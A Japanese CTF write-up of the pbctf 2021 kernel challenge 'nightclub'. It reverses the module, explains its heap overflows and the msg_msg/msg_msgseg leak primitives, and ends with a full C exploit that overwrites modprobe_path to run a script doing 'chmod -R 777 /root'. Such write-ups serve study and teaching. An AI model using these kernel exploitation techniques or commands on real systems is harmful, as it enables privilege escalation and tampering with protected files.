keywords
kernel exploit, msg_msg, msg_msgseg, modprobe_path


春は曙。
いつぞや開催された **pbctf 2021** のkernel問題**nightclub**を解いていく。
結果としては、`msg_msg`と`msg_msgseg`問題だった。


# static

## lysithea

```lysithea.txt
===============================
Drothea v1.0.0
[.] kernel version:
Linux version 5.14.1 (ss@ubuntu) (gcc (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0, GNU ld (GNU Binutils for Ubuntu) 2.34) #4 SMP Mon Oct 4 05:54:25 PDT 2021
[-] CONFIG_KALLSYMS_ALL is enabled.
you mignt be able to leak info by invoking crash.
cat: /proc/sys/kernel/unprivileged_bpf_disabled: No such file or directory
cat: /proc/sys/vm/unprivileged_userfaultfd: No such file or directory
[-] unprivileged userfaultfd is disabled.
[?] KASLR seems enabled. Should turn off for debug purpose.
Ingrid v1.0.0
[-] userfualtfd is disabled.
[-] CONFIG_STRICT_DEVMEM is enabled.
===============================
```

特に隙の無い設定。SMEP/SMAP/KASLR有効。

## reverse

なぜか、ソースコードが配布されていなかった。まさか故意に添付しなかったはずがないだろうから、おそらく配布するのを忘れてしまったのだろう。おっちょこちょい。以下が全てのコードのreverse結果。


```reversed.c
int init_module(void)
{
  // register chrdev with M/m=0/0
  major_num = __register_chrdev(0,0,0x100,"nightclub",file_ops);
  if (major_num < 0) { // error
    printk(&DAT_00100558,major_num);
    return major_num;
  }
  printk(&DAT_00100580,major_num); // success
  return 0;
}

struct file_operations file_ops = {
  .read = device_read,
  .write = device_write,
  .open = device_open,
  .release = device_release,
  .compat_ioctl = device_ioctl,
};

int device_open(struct inode*, struct file*)
{
  device_open_count = device_open_count + 1;
  try_module_get(__this_module);
  return 0;
}

int device_release(struct inode*, struct file*)
{
  device_open_count = device_open_count + -1;
  module_put(__this_module);
  return 0;
}

ssize_t device_read(struct file *, char __user *, size_t, loff_t *)
{
  return -EINVAL;
}

ssize_t device_write(struct file *, const char __user *, size_t, loff_t *) {
  printk(&DAT_00100530);
  return -EINVAL;
}

#define NIGHT_ADD   0xcafeb001
#define NIGHT_DEL   0xcafeb002
#define NIGHT_EDIT  0xcafeb003
#define NIGHT_INFO  0xcafeb004

long device_ioctl (struct file* file, unsigned int cmd, unsigned long args) {
  switch (cmd) {
    case NIGHT_ADD:
      return add_chunk();
    case NIGHT_DEL:
      return del_chunk();
    case NIGHT_EDIT:
      return edit_chunk();
    // leak diff
    case NIGHT_INFO:
      return edit_chunk - __kmalloc;
    defualt:
      return -1;
  }
}


struct night {
  night *next;
  night *prev;
  char unset1[0x16];
  ulong offset;
  char unset2[0x16];
  uint randval;
  char unset[0x14];
  char unknown2[0x10];
  char data[0x20];
};

struct userreq {
  char unknown2[0x10];
  char data[0x20];
  uint target_randval;
  uint uunknown1;
  ulong offset;
  uint size;
};

struct {
  night *next;
  night *prev;
} master_list;

uint add_chunk(userreq *arg) {
  uint randval_ret = (uint)-1;
  uint size;
  night *ptr = NULL;
  night *buf = kmem_cache_alloc_trace(XXX, 0xcc0, 0x80);
  
  /*
    unknown range check operations (skip).
  */
  
  buf->prev = NULL;
  buf->next = NULL;
  
  _copy_from_user(&buf->offset, &arg->offset, 8);
  _copy_from_user(&size, &arg->size, 4);
  if ((0x20 < size) || (0x10 < buf->offset)) {
    kfree(buf);
    return -1;
  }
  _copy_from_user(&buf->unknown2, &arg->unknown2, 0x10);
  if ((int)size < 0) { while(true) {halt();}}
  _copy_from_user(buf->data, arg->data, size);
  buf->data[size] = '\0'; // single NULL-byte overflow
  get_random_bytes(&randval_ret, 4);
  
  
  ptr = master_list->next;
  master_list->next = buf;
  buf->randval = randval_ret;
  ptr->prev = buf;
  buf->next = ptr;
  buf->prev = (night*)master_list;
  
  return randval_ret;
}

long del_chunk(userreq *arg) {
  uint target_randval, current_randval;
  night *ptr, *next, *prev;
  
  _copy_from_user(&target_randval, &arg->target_rand, 4);
  ptr = master_list->next;
  
  if (ptr != master_list) {
    do {
      /*
        unknown range check operation (skip).
      */
      
      next = ptr->next;
      current_randval = ptr->randval;
      // target night found. unlink it.
      if (current_randval == target_randval) {
        prev = ptr->prev;
        next->prev = prev;
        prev->next = next;
        // unknown clear of pointers before kfree().
        ptr->next = (night*)0xdead000000000100;
        ptr->prev = (night*)0xdead000000000122;
        kfree(ptr);
        return 0;
      }
    } while (next != master_list);
  }
}

long edit_chunk(userreq *arg) {
  uint target_randval, current_randval, size;
  ulong offset;
  night *ptr;

  _copy_from_user(&target_randval, &arg->target_rand, 4);
  _copy_from_user(&offset, &arg->offset, 8);
  if (master_list->next != master_list) {
    ptr = master_list->next;
    do {
      /*
        unknown range check operation (skip).
      */
      
      current_randval = ptr->randval;
      if (current_randval == target_randval) {
        _copy_from_user(&size, &arg->size, 4);
        if ((0x20 < size) || (0x10 < offset) { return -1; }
        _copy_from_user(ptr->data + offset, arg->data, size); // heap overflow (max 0x10 bytes)
        ptr->data[offset + size] = '\0'; // single NULL-byte overflow
        return 0;
      }
      
      ptr = ptr->next;
    } while (ptr != master_list)
  }
}
```

なお、上のソースコード中にも示したように、ところどころに謎のレンジチェックが入っていたが、リバースするのがしんどすぎたために無視した。(のちにわかったことだが、このモジュールを利用して`modprobe_path`に直接的に書き込むのを防ぐ効果があった。まぁ邪魔なだけだったけど)



## module abstraction

`f_ops`は実質的に`ioctl`のみ。
上に示した`night`という構造体の`add`/`del`/`edit`ができる。この構造体は謎のパディングがところどころ入っていて気持ち悪い。`night`たちは`master_list`変数をheadとする双方向リストで管理されており、内部に`randval`というユニークなランダム値を持っていて、これを指定することで該当`night`を削除したり編集できる。
最後に、`NIGHT_INFO`コマンドで`edit_chunk - __kmalloc`のdiffを教えてくれる。因みにこういう露骨なのは好きじゃない。


# vulns

## single NULL-byte overflow

`edit_chunk`及び`add_chunk`内において、以下のようなコードがある:

```null-byte-overflow.c
      ptr->data[offset + size] = '\0'
```

`ptr`はリスト中の`night`であり、`data`は構造体の終端に位置する`char[0x20]`型変数である。`size`は`size <= 0x20`という条件のため、上のコードで1バイト分だけNULLがオーバーフローする。


## 10 bytes overflow

同じく`edit_chunk()`内において、更新するデータは以下のように上書きされる:

```10-overflow.c
        _copy_from_user(&size, &arg->size, 4);
        if ((0x20 < size) || (0x10 < offset) { return -1; }
        _copy_from_user(ptr->data + offset, arg->data, size); // heap overflow (max 0x10 bytes)
```

`data`が`char[0x20]`であることから、0x10byte分だけ自由にoverflowできる。


## NIGHT_INFO

これはバグではないが、前述したとおり`edit_chunk - __kmalloc`を教えてくれる。これは、モジュールのアドレスさえleakできれば、このdiffを使ってkernbaseが計算できることを意味する。



# leak heap addr via `msg_msg` / `msg_msgseg`


## abstraction of heap collaption

heap内でoverflowがあり、かつ双方向リストを使っているため、`next`/`prev`を書き換えるというのが基本方針。
10byte overflowがあるものの、heapのアドレスがわかっていないために活用できない。まずはheapのアドレスをleakすることを目指す。
まず、適当に10個くらい`night`を`add`すると、以下のようなheap layoutになる。

![](https://i.imgur.com/8DMqufa.jpg)

このとき、3の`night`でNULL-overflowをすると、4の`night.next`が`0xffff8880041a4780`から`0xffff8880041a4700`になる。つまり、2を指すようになる。
その後、`del_chunk()`で3を消去し、`next`/`prev`を繋ぎ替えると、2の`prev`の値として4の`prev`の値、すなわち5のアドレスが入ることがわかる。。

![](https://i.imgur.com/AeAZW3z.jpg)

ここで重要なのは、2が既に`free`されてリスト中に存在してなかったとしても`prev`の値が書き込まれるということである。つまり、2を先に`del`しておいて、ここに何らかの構造体を入れておけば、その構造体を介して`prev`の値をleakできる。

## utilize `msg_msgseg` to read first 10bytes

さて、leakに使う構造体だが、今回は`night`の大きさが`0x80`であるため`msg_msg`を使うことにする。
だが、普通に`msg_msg`ヘッダ込みで`0x80`だけ確保しようとすると、以下のようなレイアウトになってしまう。

![](https://i.imgur.com/gl4QSI9.jpg)

上の図は`msg_msg`とuserデータを合わせたもので、この状態で`del`をして`prev`を書き込むと、`prev`は`msg_msg.m_list`内に書き込まれてしまう。これはユーザデータではない領域なので、`msgrcv()`で読み取ることができない。

ではどうすればいいかというと、これは`alloc_msg()`の実装を読めば明らかである。

```ipc/msgutils.c
struct msg_msg {
	struct list_head m_list;
	long m_type;
	size_t m_ts;		/* message text size */
	struct msg_msgseg *next;
	void *security;
	/* the actual message follows immediately */
};
struct msg_msgseg {
	struct msg_msgseg *next;
	/* the next part of the message follows immediately */
};

#define DATALEN_MSG	((size_t)PAGE_SIZE-sizeof(struct msg_msg))
#define DATALEN_SEG	((size_t)PAGE_SIZE-sizeof(struct msg_msgseg))

static struct msg_msg *alloc_msg(size_t len)
{
	struct msg_msg *msg;
	struct msg_msgseg **pseg;
	size_t alen;

	alen = min(len, DATALEN_MSG);
	msg = kmalloc(sizeof(*msg) + alen, GFP_KERNEL_ACCOUNT);
	if (msg == NULL)
		return NULL;

	msg->next = NULL;
	msg->security = NULL;

	len -= alen;
	pseg = &msg->next;
	while (len > 0) {
		struct msg_msgseg *seg;

		cond_resched();

		alen = min(len, DATALEN_SEG);
		seg = kmalloc(sizeof(*seg) + alen, GFP_KERNEL_ACCOUNT);
		if (seg == NULL)
			goto out_err;
		*pseg = seg;
		seg->next = NULL;
		pseg = &seg->next;
		len -= alen;
	}

	return msg;

out_err:
	free_msg(msg);
	return NULL;
}
```

この関数では、まず最初に`msg_msg`ヘッダと「いくらかの」ユーザデータ分の領域を確保したあと、残りのユーザデータがなくなるまでは`msg_msgseg`ヘッダと「いくらかの」ユーザデータ分の領域を確保し続ける。
ここで「いくらかの」とは、`msg_msg`(最初の1回)の場合には`DATALEN_MSG`、`msg_msgseg`の場合には`DATALEN_SEG`である。上のdefineからもわかるとおり、1回の`kmalloc`の大きさが`0x1000`になるようになっている。
よって、`0x80`分だけのメッセージを`msgsnd`する代わりに、`DATALEN_MSG + 0x80 - sizeof(msg_msg) - sizeof(msg_msgseg)`だけの大きさを持つユーザデータを送ってやれば、1つ目のユーザデータは`msg_msg`とともに`kmalloc-1K`に確保され、残りのユーザデータは`msg_msgseg`とともに`kmalloc-128`に入ってくれる。そして、`msg_msg`が0x30bytesもあるのに対して`msg_msgseg`は0x8bytesしかない。これによって、**`msgrcv()`を使うと最初の8byteを除いて任意の大きさの構造体からデータを読み取ることが可能になる。**
以上でheapbaseのlaek完了。



# leak module base and kernbase

続いて、モジュールベースを求める。双方向リストゆえ、最新の`night`は`prev`としてヘッドの`master_list`のアドレスを保持している。これを読めれば良い。
この時点でheapbaseがわかっているため、10bytes-overflowを使って`night`の`next/prev`をヒープ内の任意のアドレスに書き換えることができる。もちろんread機能はないために直接読み取ることはできないが、`msg_msg`ヘッダ内の`m_ts`を書き換えることで`msgrcv`時に読み込むサイズを任意に大きくすることができる。
なお、前のヒープのleakの段階でリストが壊れているが、基本的にリストの探索はターゲットが見つかれば打ち切られるため新しい`night`を確保してそれらだけを利用すれば、特に問題はない。
これで、ヒープ内を雑に読み込んで、モジュールベースのleak完了。
前述したとおり、`edit_chunk - __kmalloc`がわかっているため、これでkbaseがleakできたことになる。


# overwrite `modprobe_path`

## unknown range check prevents overwriting...?

最後に`modprobe_path`を書き換える。普通に考えると、10byte-overflowを使って`night.next`が`modprobe_path - x`を指すようにして、`edit_chunks()`で書き換えれば終わりのように思える。
だが、実際に試してみると、最後の`edit_chunks()`がどうしても不正な値を返してきた。おそらくだが、最初の"reversing"の項で無視したレンジチェックみたいなところで、ヒープ外の値に書き込もうとするとエラーを出すようになっているぽい。詳しくは見てないから勘だけど。


## directly overwrite heap's next pointer

少し実験した感じ、SLUBのfreelistのHARDENINGとかRANDOMIZEとかのコンフィグは有効になっていなかった(例え有効になっていても、ここまでheapを掌握していれば大丈夫なような気もするけど)。heapのnextポインタは、今回の場合offset:+0x40に置かれていた。よって、これを直接書き換えることで、次の次のkmallocの際に`modprobe_path`上にchunkを置くことができる。このchunkに入れる構造体は、やはり`msg_msg`で良い。


# exploit

```exploit.c
#include "./exploit.h"
#include <sys/ipc.h>
#include <sys/mman.h>

/*********** commands ******************/
#define DEV_PATH "/dev/nightclub"   // the path the device is placed

#define NIGHT_ADD   0xcafeb001
#define NIGHT_DEL   0xcafeb002
#define NIGHT_EDIT  0xcafeb003
#define NIGHT_INFO  0xcafeb004

//#define DATALEN_MSG	((size_t)PAGESIZE-sizeof(struct msg_msg))
#define DATALEN_MSG	((size_t)PAGE-0x30)
#define DATALEN_SEG	((size_t)PAGE-0x8)

struct night{
  struct night *next; // double-linked list, where new node is inserted into head->next.
  struct night *prev;
  char unset1[0x16];
  ulong offset;
  char unset2[0x16];
  uint randval;
  char unset[0x14];
  char unknown2[0x10];
  char data[0x20];
} night;

struct userreq{
  char unknown2[0x10];
  char data[0x20];
  uint target_randval;
  uint uunknown1;
  ulong offset;
  uint size;
};

/*********** globals ******************/

int night_fd = -1;
const ulong diff_master_list_edit = 0xffffffffc0002100 - 0xffffffffc0000010;
const ulong diff_modprobe_path = 0xffffffff8244fca0 - 0xffffffff81000000;

// (END globals)

long night_ioctl(ulong cmd, void *req) {
  if (night_fd == -1) errExit("night_fd is not initialized.");
  long ret = ioctl(night_fd, cmd, req);
  assert(ret != -1);
  return ret;
}

uint night_info(void) {
  long diff = night_ioctl(NIGHT_INFO, NULL);
  return diff;
}

uint night_add(char *buf, ulong offset, uint size) {
  struct userreq req = {
    .offset = offset,
    .size = size,
  };
  memcpy(req.data, buf, 0x20);
  long ret = night_ioctl(NIGHT_ADD, &req);
  assert(ret != -1);
  return ret;
}

void night_edit(char *buf, uint target_randval, ulong offset, uint size) {
  struct userreq req = {
    .offset = offset,
    .size = size,
    .target_randval = target_randval,
  };
  memcpy(req.data, buf, 0x20);
  assert(night_ioctl(NIGHT_EDIT, &req) == 0);
}

void night_del(uint target_randval) {
  struct userreq req = {
    .target_randval = target_randval,
  };
  assert(night_ioctl(NIGHT_DEL, &req) == 0);
}

struct msgbuf80 {
  long mtype;
  char mtext[0x80];
};
struct msgbuf80alpha {
  long mtype;
  char mtext[(DATALEN_MSG + 0x30) + 0x80 - 8]; // -8 is for msg_msgseg of second segment
};

int main(int argc, char *argv[]) {
  puts("[ ] Hello, world.");
  assert((night_fd = open(DEV_PATH, O_RDWR)) > 2);
  char *buf = mmap(NULL, PAGE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  assert(buf != MAP_FAILED);
  memset(buf, 'A', PAGE);

  // prepare for modprobe_path tech
  system("echo -n '\xff\xff\xff\xff' > /home/user/evil");
  system("echo '#!/bin/sh\nchmod -R 777 /root\ncat /root/flag' > /home/user/nirugiri");
  system("chmod +x /home/user/nirugiri");
  system("chmod +x /home/user/evil");

  // clean kmalloc-128
  puts("[.] cleaning heap...");
  #define CLEAN_N 40
  struct msgbuf80 clean_msg80 = { .mtype = 1 };
  struct msgbuf80alpha clean_msg80alpha = { .mtype = 1 };
  memset(clean_msg80.mtext, 'X', 0x80);
  memset(clean_msg80alpha.mtext, 'X', sizeof(clean_msg80alpha.mtext));
  for (int ix = 0; ix != CLEAN_N; ++ix) {
    int qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    KMALLOC(qid, clean_msg80, 1);
  }

  // get diff of __kernel and edit_chunk and __kmalloc
  uint edit_kmalloc_diff = night_info();
  printf("[+] edit_chunk - __kmalloc: 0x%x\n", edit_kmalloc_diff);

  // add first chunks
  #define FIRST_N 10
  uint randvals[FIRST_N] = {0};
  printf("[.] allocating first chunks (%d)\n", FIRST_N);
  for (int ix = 0; ix != FIRST_N; ++ix) {
    randvals[ix] = night_add(buf, 0, 0x1F);
    printf("[.] alloced randval: %x\n", randvals[ix]);
  }

  // single NULL-byte overflow into night[6]->next
  night_edit(buf, randvals[5], 0, 0x20);

  night_del(randvals[4]);
  // allocate msg_msgseg + userdata at &night[4]
  int qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
  KMALLOC(qid, clean_msg80alpha, 1);
  // make night[2]->prev point to &night[4]
  night_del(randvals[6]);
  // leak heap addr via msg_msgseg
  ssize_t n_rcv = msgrcv(qid, &clean_msg80alpha, sizeof(clean_msg80alpha.mtext) - 0x30, clean_msg80alpha.mtype, 0);
  printf("[+] received 0x%x size of message.\n", n_rcv);
  ulong leaked_heap = *(ulong*)(clean_msg80alpha.mtext + DATALEN_MSG);
  ulong heap_base = leaked_heap - 0x380;
  printf("[!] leaked heap: 0x%lx\n", leaked_heap);
  printf("[!] heapbase: 0x%lx\n", heap_base);


  /** overwrite next pointer, edit msg_msg's size, read heap sequentially, leak master_list. **/

  // heap is tampered, allocate fresh nights.
  #define SECOND_N 6
  uint randvals2[SECOND_N] = {0};
  for (int ix = 0; ix != SECOND_N; ++ix) {
    randvals2[ix] = night_add(buf, 0, 0x20);
  }

  // allocate simple msg_msg + userdata
  memset(clean_msg80.mtext, 'Y', 0x50);
  KMALLOC(qid, clean_msg80, 1);

  // overflow to overwrite night[1]->next to allocated msg_msg
  printf("[+] overwrite next target with 0x%lx\n", heap_base+ 0x700 + 0x10 - 0x60);
  *(ulong*)(buf + 0x10) = heap_base + 0x700 + 0x10 - 0x60;
  night_edit(buf, randvals2[3], 0x10, 0x20);

  // edit to overwrite msg_msg.m_ts with huge value
  ulong val[0x2];
  val[0] = 1;
  val[1] = 0x200; // m_ts
  night_edit((char*)val, 0x41414141, 0, 0x10);

  // allocate new night and read master_list
  night_add(buf, 0, 0);
  n_rcv = msgrcv(qid, &clean_msg80, 0x500, clean_msg80alpha.mtype, 0);
  printf("[+] received 0x%x size of message.\n", n_rcv);
  ulong master_list = *(ulong*)(clean_msg80.mtext + 0xb * 8);
  ulong edit_chunk = master_list - diff_master_list_edit;
  ulong __kmalloc = edit_chunk - edit_kmalloc_diff;
  ulong kbase = __kmalloc - 0x1caa50;
  ulong modprobe_path = kbase + diff_modprobe_path;
  printf("[!] master_list: 0x%lx\n", master_list);
  printf("[!] edit_chunk: 0x%lx\n", edit_chunk);
  printf("[!] __kmalloc: 0x%lx\n", __kmalloc);
  printf("[!] kbase: 0x%lx\n", kbase);
  printf("[!] modprobe_path: 0x%lx\n", modprobe_path);

  /** overwrite modprobe_path **/
  strcpy(clean_msg80.mtext, "/home/user/nirugiri\x00");

  // heap is collapsed, allocate fresh nights.
  #define THIRD_N 2
  uint randvals3[THIRD_N] = {0};
  for (int ix = 0; ix != THIRD_N; ++ix) {
    randvals3[ix] = night_add(buf, 0, 0x20);
  }

  // overwrite night's next ptr
  printf("[+] overwrite next target with 0x%lx\n", heap_base + 0x8c0 - 0x60);
  *(ulong*)(buf + 0x10) = heap_base + 0x8c0 - 0x60; // heap's next ptr is placed at +0x40 of chunk.
  night_edit(buf, randvals3[0], 0x10, 0x20);

  // edit to overwrite heap's next pointer
  val[0] = modprobe_path - 0xa0 + 0x80 - 0x10;
  val[1] = 0x0;
  night_edit((char*)val, 0x0, 0, 0x10);

  // overwrite modprobe_path
  night_add(buf, 0, 0);
  puts("[+] allocating msg_msg on modprobe_path.");
  qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
  KMALLOC(qid, clean_msg80, 1);

  // invoke evil script
  puts("[!] invoking evil script...");
  system("/home/user/evil");

  // end of life
  puts("[ ] END of life...");
}
```


# アウトロ

![](https://i.imgur.com/494smWN.png)

`msg_msg`はread/writeに関して言えばかなり万能でいいですね。**とりわけ`msg_msgseg`と組み合わせることで、0x8 ~ 0x1000 bytes までの任意のサイズに対してread/writeができるのが強いです。**

この問題自体は、問題が少しわざとらしかったり、構造体にパディングが多くあからさまだったり、そして何よりソースコードの配布を「おっちょこちょい」で忘れてしまってたりと荒削りなところも合ったけど、`msg_msg`の汎用性の再確認ができる言い問題だったと思います。


次回、池の水全部飲んでみたでお会いしましょう。


続く。


# 参考 

msg_msg primitive
https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
other example of msg_msg
https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html
other writeup for this chall
https://www.willsroot.io/2021/10/pbctf-2021-nightclub-writeup-more-fun.html
other writeup for this chall
https://kileak.github.io/ctf/2021/pb21-nightclub/
useful structures
https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628
ニルギリ
https://youtu.be/yvUvamhYPHw


